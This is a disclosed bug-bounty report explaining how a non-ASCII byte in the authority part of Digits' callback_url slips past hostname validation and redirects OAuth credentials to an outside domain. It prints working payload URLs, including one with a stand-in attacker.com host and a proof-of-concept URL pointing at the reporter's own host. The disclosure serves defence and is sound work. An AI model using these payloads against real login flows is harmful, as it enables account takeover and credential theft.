# Bypassing callback_url validation on Digits

## Report Details
- **Report ID**: 108113
- **URL**: https://hackerone.com/reports/108113
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-04T16:49:58.642Z
- **Disclosed**: 2016-08-12T20:34:31.579Z

## Reporter
- **Username**: filedescriptor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi,
I would like to report an issue in Digits which allows attacker to bypass the *callback_url* validation of an application and thus takeover an account.

#Detail
Digits is a part of the Fabric SDK which offers phone-based sign in. It also provides web login flow. In the [navigation-based authentication flow](https://docs.fabric.io/web/digits/sign-in-options.html#callback-url), the OAuth credential data is passed to the specified callback URL (*callback_url*) after a user granted access to an application using HTTP 302 redirect. This parameter is supposed to be validated to match the registered domain of the application. Here's an example for Periscope:

> https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.digits.com&callback_url=https://www.periscope.tv

callback_url=https://www.periscope.tv matches the application's registered domain, so no problem.

If we modify it:
> https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.digits.com&callback_url=https://example.com

callback_url=https://example.com does not match the application's registered domain, thus the request is rejected.

Now, it is noticed that the validation is rather loose. For example, it parses the URL and compares only the hostname part. In other words, a URL with authority part is allowed (e.g. callback_url=https://whatever@www.periscope.tv). It is still a solid validation because the hostname part is correctly handled (something like https://whatever\@www.periscope.tv won't work). 

However, it is discovered that when outputting a non-ASCII character in the header, it will get converted to a question mark (?). **This happens after the validation.** Thus, attacker can bypass the validation by putting his/her own domain followed by a non-ASCII character in the authority part.

Here's how it works:

Input:
``` 
https://attacker.com%ff@www.periscope.tv
--------\  authority   /\   hostname   /
```

The URL is parsed and passes the validation because the hostname matches the registered domain.

Output:
``` 
https://attacker.com?@www.periscope.tv
--------\ hostname /-\     query     /
```

Since the URL is outputted in the location header, %ff which is non-ASCII is converted. Now suddenly the hostname becomes attacker.com and everything after the question mark becomes the query part. Finally the victim will be redirected to attacker's site with victim's account's OAuth credential.

#Impact
It affects every application that has integrated Digits, and even official application (Periscope). Attacker can abuse the flaw to login to victim's account on the affected applications.

#PoC
1. Prepare a Periscope account which is associated with a phone number
2. Login to Periscope using the phone number with digits web login flow: https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.digits.com&callback_url=https://innerht.ml%FF@www.periscope.tv
3. After that your account will be renamed as "Pwn3d"

Video demo: https://vimeo.com/150671313 (password: token)

#Fix
The *callback_url* should discard the authority part before outputting.

## Attachments
No attachments
